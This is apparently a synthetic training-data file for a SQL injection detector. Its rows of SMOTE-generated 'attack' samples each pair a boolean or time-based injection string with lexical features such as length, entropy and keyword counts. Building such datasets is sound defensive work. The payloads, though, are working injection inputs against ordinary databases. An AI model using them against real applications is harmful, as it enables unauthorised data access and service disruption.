id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000880,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000072,2.094933908941593,138.6445054878277,33.258310442064605,3.570857994645641,39.6138049542369,15.0,62.12788460369849,21.90281592989232,0.2870823319018115,0.10827897927699098,0.4470429493668752,0.1575957394543223,2.0,4.0,0.0,1.0,0.0,1.580563185978464,0.0,11.161126371956929,1.161126371956928,0.0,1.0,2.5805631859784643,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.580563185978464,0.41943681402153593,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000881,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R000121,0.49413337755906167,119.14040763218374,28.0,4.049665886402758,80.35089465605654,3.0,23.70178931211307,12.087723664014135,0.6747427195523334,0.025202405039684878,0.19857560895905788,0.10147926644892372,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,0.9122763359858661,0.0,2.175447328028268,0.0,0.0,2.0,1.912276335985866,1.0,0.0,0.0,0.0,0.0,0.9122763359858661,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000882,attack,boolean,-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,nearest_attack_euclidean,R000151,1.4475093733145799,82.54052673484411,19.891886139518377,2.938266020062886,11.108113860481623,13.513508911614704,43.02701782322941,14.891886139518379,0.137237326718603,0.162901335368635,0.5205820969826395,0.1792792409301225,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.756754455807352,0.7567544558073513,0.0,0.3783772279036758,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000883,attack,boolean,"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000133,0.7031729315792219,144.5936584427804,33.600975624187626,3.896188765497239,42.396585315343295,24.0,53.19707312743711,25.0,0.2929111821274308,0.16618592446039393,0.3677925554325983,0.173110337979577,0.0,0.8004878120938148,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.199512187906185,0.0,2.0,1.0,10.0,0.0,0.8004878120938148,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.1995121879061852,0.8004878120938148,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000884,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000008,0.5589478016260206,120.95605408073858,29.165201802691286,4.0644145896725385,68.30403605382571,8.0,32.156412618839,12.495605408073857,0.5639539836440586,0.06662444304169174,0.26609035116216506,0.1033312221520846,1.0,0.0,0.3304036053825721,-1.3877787807814457e-17,1.0,1.0,0.0,4.1652018026912865,0.0,0.0,2.0,2.330403605382572,1.0,0.0,0.16520180269128595,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000885,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000130,0.9200760333264623,135.63441449114393,28.710349094303506,3.2276045310166026,36.317207245571964,13.0,68.31720724557196,18.0,0.2671228154162659,0.0961080444313823,0.5036964632473608,0.1330726769049909,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.579301811392991,1.4206981886070094,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000886,attack,boolean,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000028,0.9686876122536711,129.68450953036384,30.0,3.871215264108467,59.88092641884336,9.88988419764458,41.53572207434699,18.377976839528916,0.4521008015381743,0.0784187870459796,0.32643695612421436,0.14304345529163176,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.511907358115665,2.0,0.37797683952891614,1.622023160471084,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000887,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000012,0.5821890888281105,86.3682568980558,23.020954138833485,3.3151102884303567,19.694605518444646,12.83682568980558,40.0,13.83682568980558,0.22689275797843195,0.14872571693300782,0.4640544469810267,0.16032707810753347,4.0,0.0,0.1631743101944193,-1.3877787807814457e-17,0.0,2.0,0.0,6.0,0.0,0.8368256898055806,0.8368256898055807,2.163174310194419,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8368256898055806,0.1631743101944193,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000888,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000044,2.089793490111329,73.70095801778699,24.9401916035574,3.662587350076078,15.880383207114793,21.0,27.4102874053361,9.410287405336097,0.21462722969031425,0.28623736591936766,0.3722408590177452,0.1268945453725729,0.9401916035573977,0.0,1.0598083964426022,-1.3877787807814457e-17,1.0,2.0,0.0,3.470095801778699,0.0,0.0,0.0,5.0,0.4700958017786988,0.0,0.5299041982213011,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.47009580177869886,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.470095801778699
SMOTE_000889,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000111,2.5138432707595695,141.63812475433934,33.11700891102424,3.82007575686746,49.28709802126664,12.207477722439402,55.02654009960908,25.11700891102424,0.34361800323485053,0.08882551647661688,0.38916913084074295,0.1783873494477896,0.0,1.6755133665363593,0.8829910889757604,-1.3877787807814457e-17,0.0,1.0,0.0,11.55850445551212,0.0,2.0,1.0,7.882991088975761,0.0,0.5585044555121197,0.44149554448788025,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.5585044555121198,0.0,0.0,0.5585044555121197,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1170089110242394
SMOTE_000890,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000134,0.4434667887489777,126.25935465744497,30.314838664361243,4.079533585935769,71.6296773287225,8.157419332180623,31.472257996541867,15.0,0.5673561194232611,0.06457759875266274,0.2492025416653798,0.11886374015869626,0.8425806678193776,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.0,0.8425806678193777,0.0,2.1574193321806225,4.0,0.8425806678193777,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000891,attack,boolean,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000017,0.7807243726182944,75.75843011124786,20.24156988875214,3.0492073492007172,6.448498203544162,16.0,37.51686022249572,15.793071685207977,0.08647196106030014,0.21142584931773079,0.49359082361116813,0.2085113660108009,0.0,4.0,1.0,-1.3877787807814457e-17,0.793071685207977,2.0,0.0,5.586143370415954,2.0,0.206928314792023,0.20692831479202312,3.793071685207977,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000892,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000051,0.8761893947667048,151.9741007261797,32.35899280527288,4.1089420350348735,78.33309353145256,16.0,42.28201438945424,15.35899280527288,0.5146071588866927,0.10549260114832859,0.2784904871907082,0.1014097527742705,0.0,0.3589928052728799,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.3589928052728799,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000893,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,0.2643685720971516,160.89605760367994,32.0,4.047700571777164,73.89605760367994,18.0,48.0,21.0,0.45927628150311156,0.11187387279245968,0.29833032744655913,0.13051951825786962,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.0,0.0,5.0,4.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.8960576036799286,0.1039423963200714,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000894,attack,boolean,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",nearest_attack_euclidean,R000089,0.4776096264906125,77.19481318779609,27.04870329694902,3.86980606695762,17.14610989084706,24.0,25.04870329694902,11.0,0.2206897746326214,0.3117409916274131,0.32468794591073435,0.142881287829231,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000895,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R000084,1.1534720596331447,154.72797275287164,29.70710959738176,3.8726205970107186,72.65687677905406,10.343123220945941,53.48531516858109,18.242657584290544,0.4696523912052499,0.06835721537536872,0.344725175178666,0.11726521824071542,2.8284383895270295,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,7.414219194763515,0.0,0.0,2.0,3.0,0.7071095973817574,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000896,attack,boolean,"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000015,0.11763312856146332,137.9170921862142,30.0,3.909004204662838,73.3246887134205,8.0,40.69430260459527,15.898100868198423,0.5313194538711723,0.05802736038947537,0.2952964042193166,0.11535678152003584,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.898100868198423,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000897,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000156,0.833966646429852,138.62990776152046,27.79074769403801,3.283860006471884,40.32598155230409,13.0,68.14093543306433,17.162990776152046,0.29241929952348156,0.09535324554010007,0.488022400299316,0.12420505463710232,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.74448616422807,0.4185046119239768,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000898,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""sfnj"" like ""sfnj",nearest_attack_euclidean,R000090,0.7635294638804632,131.98250125320044,28.19650025064009,3.9906685192301996,84.0,3.0,31.786001002560354,13.196500250640089,0.6365890151959566,0.022735321971284153,0.24071107950640958,0.09996458332634968,0.5895007519202666,2.4104992480797334,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.196500250640089,0.0,0.0,2.0,1.0,0.19650025064008886,0.8034997493599111,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000899,attack,boolean,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000082,1.071511458468593,65.61231020802234,21.63269388001396,3.379763251354626,9.979616328008376,13.979616328008376,28.0,13.653077552005584,0.15139839856747744,0.21255439212167165,0.42809195487935936,0.2079552544314915,0.0,4.0,0.3265387760027918,-1.3877787807814457e-17,0.0,2.0,0.0,4.0,2.0,0.32653877600279185,1.0,2.326538776002792,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6734612239972082,0.3265387760027918,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000900,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000120,1.5812891227011936,139.2272031856105,32.62662834388497,3.610363929514587,43.0,15.0,60.480459873380426,20.74674331223007,0.30956183254430963,0.1079866857712708,0.4334236710689184,0.1490278106155012,3.493486624460142,2.5065133755398588,0.0,1.0,0.0,2.0,0.0,10.74674331223007,0.0,0.0,1.0,3.0,1.0,0.6266283438849645,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000901,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000018,0.6587246201282685,76.37708377728808,28.098379876271157,3.884704113460636,19.73773182677962,21.0,26.0,9.639351950508463,0.25726947661942784,0.27556321826030294,0.3411735083222798,0.12599379679798944,0.0,0.8196759752542313,2.0,-1.3877787807814457e-17,0.1803240247457687,2.0,0.0,3.0,0.0,0.8196759752542313,0.8196759752542314,4.180324024745769,0.0,0.8196759752542314,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000902,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000040,0.9069510474696031,116.9233207023931,28.538339648803454,4.063105922585417,71.9249052679482,5.691698244017264,27.306717190427626,12.0,0.6146459062994185,0.048863999904066174,0.23385127500843206,0.1026388187880832,1.9233207023930943,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,3.0766792976069057,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000903,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000134,0.645821897684558,126.88399024425179,30.565197073275538,4.079322662278205,71.0,8.18839902442518,32.130394146551076,15.565197073275538,0.5600732854908517,0.06450239739846715,0.2529123301183454,0.12251198699233572,0.8116009755748208,0.18839902442517897,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.188399024425179,1.0,0.0,2.188399024425179,4.0,0.811600975574821,0.188399024425179,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000904,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000128,0.20691747049063958,95.74277657717636,28.914258859058787,3.6212726197898166,32.0,13.257223422823643,38.65703543623514,11.82851771811757,0.3342552810853894,0.13855705119710765,0.4036858328145941,0.12350183490290889,0.9142588590587856,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.914258859058785,0.0,1.0,1.0,2.0,0.9142588590587857,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000905,attack,boolean,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000025,0.34809743694846035,140.82311443464397,32.674667253172466,4.238825169114143,70.57422359073576,16.22488908439082,38.34933450634493,15.674667253172464,0.5013685532249675,0.11534932095967576,0.2721302300354265,0.11115189577993023,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.224889084390822,0.0,0.0,2.2248890843908216,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000906,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000029,0.7557174866847927,147.1916181401355,31.21602937383573,4.138102283089495,80.57139783636751,9.648088121507193,40.97213218226079,16.0,0.543786136212022,0.06658541155725052,0.2805459732114892,0.10908247901923829,1.2160293738357315,0.0,0.0,0.10801468691786574,0.8919853130821342,1.0,0.0,5.432058747671463,0.0,0.0,2.783970626164269,2.0,1.0,0.0,0.0,1.0000000000000002,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8919853130821342,0.0,0.0,0.8919853130821341,0.8919853130821342,0.10801468691786575,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7839706261642685
SMOTE_000907,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000050,2.083645467965428,136.38539940778097,29.42317492597262,4.002050782915156,66.26952477791787,9.153650148054759,39.80857433375358,21.15365014805476,0.48599135252798553,0.06738023119572727,0.29118893018232345,0.1554394860939637,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.8463498519452415,2.0,2.884125370136898,3.1536501480547594,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.4231749259726203,0.5768250740273796,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000908,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,0.6638102314085204,90.85093297246222,29.807463779697745,3.539401416922563,18.21119566954662,16.0,41.19253622030225,15.447201082613345,0.20026863815378484,0.1761153934603913,0.453538886098781,0.17007708228704288,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.298134055075564,0.2981340550755636,0.8509329724622182,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
